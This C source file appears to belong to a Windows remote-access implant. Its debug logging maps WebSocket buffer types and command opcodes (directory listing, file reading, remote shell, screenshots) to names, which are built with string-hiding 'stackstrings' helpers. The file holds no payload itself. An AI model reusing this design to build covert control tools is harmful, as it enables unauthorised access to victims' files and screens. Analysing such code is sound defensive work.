#include "report.h"

#ifdef LOGGING_ENABLED

#include "types.h"
#include "logger.h"
#include "stackstrings.h"

void ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type, PCHAR out)
{
    switch (type) {
    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:
        StrNameBinMsg(out); break;
    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE:
        StrNameBinFrag(out); break;
    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:
        StrNameUtf8Msg(out); break;
    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:
        StrNameUtf8Frag(out); break;
    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:
        StrNameClose(out); break;
    default:
        StrNameUnknown(out); break;
    }
}

void command_name(unsigned char opcode, PCHAR out)
{
    switch (opcode) {
    case CMD_LIST_DIRECTORY:   StrNameListDir(out); break;
    case CMD_READ_FILE:        StrNameReadFile(out); break;
    case CMD_HASH_FILE:        StrNameHashFile(out); break;
    case CMD_WRITE_SHELL:      StrNameWriteShell(out); break;
    case CMD_READ_SHELL:       StrNameReadShell(out); break;
    case CMD_GET_DISPLAYS:     StrNameGetDisplays(out); break;
    case CMD_GET_SCREENSHOT:   StrNameGetScreenshot(out); break;
    case CMD_CLOSE_SHELL:      StrNameCloseShell(out); break;
    case CMD_EXIT:             StrNameExit(out); break;
    case CMD_OPEN_SHELL:       StrNameOpenShell(out); break;
    default:                   StrNameUnknown(out); break;
    }
}

#endif
